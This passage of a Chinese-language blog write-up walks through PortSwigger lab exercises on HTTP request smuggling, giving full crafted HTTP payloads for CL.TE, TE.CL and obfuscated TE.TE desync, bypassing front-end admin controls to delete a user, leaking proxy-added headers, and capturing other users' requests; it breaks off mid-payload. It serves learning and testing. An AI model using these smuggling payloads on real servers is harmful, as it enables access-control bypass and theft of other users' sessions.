id="0x04-漏洞案例与组合拳"><a href="#0x04-漏洞案例与组合拳" class="headerlink" title="0x04 漏洞案例与组合拳"></a>0x04 漏洞案例与组合拳</h2><h3 id="CL-TE-1"><a href="#CL-TE-1" class="headerlink" title="CL.TE"></a>CL.TE</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p><p>构造报文如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: acf61f721e2f15be80da0791004a0040.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>发送两次即可成功得到GPOST错误响应：</p><p><img src="/2020/03/11/浅析HRS漏洞/6.png" alt=""></p><p>这是因为前端服务器只认CL头，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>当请求包经过前端服务器转发给后端服务器时，后端服务器只认TE头，当它读取到<code>0\r\n\r\n</code>时，认为已经读取到结尾了，但是剩下的字母<code>G</code>就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求，服务器在解析时当然会产生报错了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">Host: ace01fcf1fd05faf80c21f8b00ea006b.web-security-academy.net\r\n</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="TE-CL-1"><a href="#TE-CL-1" class="headerlink" title="TE.CL"></a>TE.CL</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p><p>首先我们构造如下报文，注意0之后必须要有两个回车：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">G</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>发送两次之后得到的是“G0POST”而非“GPOST”：</p><p><img src="/2020/03/11/浅析HRS漏洞/7.png" alt=""></p><p>要达到题目要求，那么我们修改下请求，中间再夹杂一个报文请求即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac9a1f2d1e1f8046806d5ca1003d009c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>注意，这里GPOST前面的12即是满足chunk格式的十六进制数，指明后面<code>GPOST / HTTP/1.1\r\n</code>的字节数即为0x12=18。</p><p>由于前端服务器处理TE头，当其读取到<code>0\r\n\r\n</code>时，认为是读取完毕了，此时这个请求对前端服务器来说是一个完整的请求，然后转发给后端服务器；后端服务器处理CL头，当它读取完<code>12\r\n</code>之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GPOST / HTTP/1.1\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>发送两次报文即可成功报错：</p><p><img src="/2020/03/11/浅析HRS漏洞/8.png" alt=""></p><h3 id="TE-TE-1"><a href="#TE-TE-1" class="headerlink" title="TE.TE"></a>TE.TE</h3><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p>题目要求：本实验涉及一个前端和后端服务器，两个服务器以不同的方式处理重复的HTTP请求标头。前端服务器拒绝未使用GET或POST方法的请求。要解决此问题，请向后端服务器走私一个请求，以便后端服务器处理的下一个请求似乎使用GPOST方法。</p><p>构造报文如下，经过多种混淆TE头的测试，如下这种形式可行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac201f121ec32767801f0d6a00ff0062.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">12</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>这里混淆了TE头。前端服务器能够正常解析这个TE头，将<code>0\r\n\r\n</code>之前的内容都传递给后端服务器；而后端服务器并不能正常解析这个TE头，导致只能解析CL头获取得到请求体大小为4，即只获取了<code>12\r\n</code>的内容，而这之后的“GPOST”开头的内容则放到缓存中和下一个请求合并一起解析，从而成功导致GPOST请求失败。</p><p>发送两次报文即可成功报错：</p><p><img src="/2020/03/11/浅析HRS漏洞/9.png" alt=""></p><h3 id="绕过前端服务器的安全控制"><a href="#绕过前端服务器的安全控制" class="headerlink" title="绕过前端服务器的安全控制"></a>绕过前端服务器的安全控制</h3><blockquote><p>在这个网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用<code>CL-TE</code>和<code>TE-CL</code>绕过前端的访问控制。</p></blockquote><h4 id="CL-TE场景绕过"><a href="#CL-TE场景绕过" class="headerlink" title="CL.TE场景绕过"></a>CL.TE场景绕过</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。</p><p>先直接用CL.TE的构造报文，改下请求/admin接口即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br></pre></td></tr></table></figure><p>需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个<code>\r\n</code>不能丢弃。</p><p>发送两次，看到是向/admin接口访问了，但是返回说需要本地才能访问：</p><p><img src="/2020/03/11/浅析HRS漏洞/10.png" alt=""></p><p>在前面构造的报文中添加<code>Host: localhost</code>头字段即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 45</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure><p>发送两次，能成功访问/admin页面了，这里可看到carlos用户的信息及其删除的接口<code>/admin/delete?username=carlos</code>：</p><p><img src="/2020/03/11/浅析HRS漏洞/11.png" alt=""></p><p>构造最终的报文访问该删除接口即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure><p>多发送几次，发现已经302了，此时是已经成功删除carlos用户的了：</p><p><img src="/2020/03/11/浅析HRS漏洞/12.png" alt=""></p><p>此时重新登录再次查看，发现已经没有carlos用户了：</p><p><img src="/2020/03/11/浅析HRS漏洞/13.png" alt=""></p><h4 id="TE-CL场景绕过"><a href="#TE-CL场景绕过" class="headerlink" title="TE.CL场景绕过"></a>TE.CL场景绕过</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。</p><p>和前面类似，不再多说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca31f051f556e6780403e2f00570083.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">3d</span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p><img src="/2020/03/11/浅析HRS漏洞/14.png" alt=""></p><p><img src="/2020/03/11/浅析HRS漏洞/15.png" alt=""></p><h3 id="获取前端服务器重写请求字段"><a href="#获取前端服务器重写请求字段" class="headerlink" title="获取前端服务器重写请求字段"></a>获取前端服务器重写请求字段</h3><blockquote><p>在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p><ul><li>描述TLS连接所使用的协议和密码</li><li>包含用户IP地址的XFF头</li><li>用户的会话令牌ID</li></ul><p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p><ul><li>找一个能够将请求参数的值输出到响应中的POST请求</li><li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li><li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li></ul></blockquote><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。/admin上有一个管理面板，但只有IP地址为127.0.0.1的用户才能访问。前端服务器将HTTP标头添加到包含其IP地址的传入请求中。它类似于X-Forwarded-For标头，但名称不同。要解决此问题，请向后端服务器走私一个请求，以显示前端服务器添加的标头。然后将包含添加的标头的请求走私到后端服务器，访问管理面板，并删除用户carlos。</p><p>我们像之前一样发包尝试通过Host头设置127.0.0.1来访问/admin，发现行不通：</p><p><img src="/2020/03/11/浅析HRS漏洞/18.png" alt=""></p><p>那就是说，后端服务器不是通过Host头而是通过其他可能是前端服务器添加的头来解析得到IP地址的。</p><p>此时，我们需要先找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能：</p><p>首先我们找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能：</p><p><img src="/2020/03/11/浅析HRS漏洞/16.png" alt=""></p><p>其中该请求报文如下，直接POST方式带上search参数访问/即可：</p><p><img src="/2020/03/11/浅析HRS漏洞/17.png" alt=""></p><p>接着构造如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 78</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 100</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=mi1k7ea</span><br></pre></td></tr></table></figure><p>其中CL值为100，而后面数据的长度是不够100的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达100时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。</p><p>发送几次看到Search结果处返回了包含X-NntHAY-Ip头，它的值为IP地址：</p><p><img src="/2020/03/11/浅析HRS漏洞/19.png" alt=""></p><p>将之前CL.TE的构造报文的头改下就ok了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 52</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-NntHAY-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure><p>多发送几次就能成功访问到/admin页面：</p><p><img src="/2020/03/11/浅析HRS漏洞/20.png" alt=""></p><p>最后就是构造删除carlos用户的报文了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 75</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">X-NntHAY-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure><p>多发送几次即可：</p><p><img src="/2020/03/11/浅析HRS漏洞/21.png" alt=""></p><p><img src="/2020/03/11/浅析HRS漏洞/22.png" alt=""></p><h3 id="获取其他用户的请求"><a href="#获取其他用户的请求" class="headerlink" title="获取其他用户的请求"></a>获取其他用户的请求</h3><blockquote><p>在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。</p></blockquote><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。为了解决实验室问题，请将请求走私到后端服务器，该请求将下一个用户的请求存储在应用程序中。然后检索下一个用户的请求，并使用受害用户的cookie来访问其帐户。</p><p>首先我们需要找到保存用户POST参数的页面，这里我们随便点击一篇博文查看，在提交评论的时候可以在文章评论一栏中保存我们POST的内容：</p><p><img src="/2020/03/11/浅析HRS漏洞/23.png" alt=""></p><p>对应如下接口：</p><p><img src="/2020/03/11/浅析HRS漏洞/24.png" alt=""></p><p>构造如下请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac0b1fda1f41126280f9132f0097008c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://ac0b1fda1f41126280f9132f0097008c.web-security-academy.net/post/comment/confirmation?postId=2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDt</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 270</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net</span><br><span class="line">Cookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDt</span><br><span class="line">Content-Length: 400</span><br><span class="line"></span><br><span 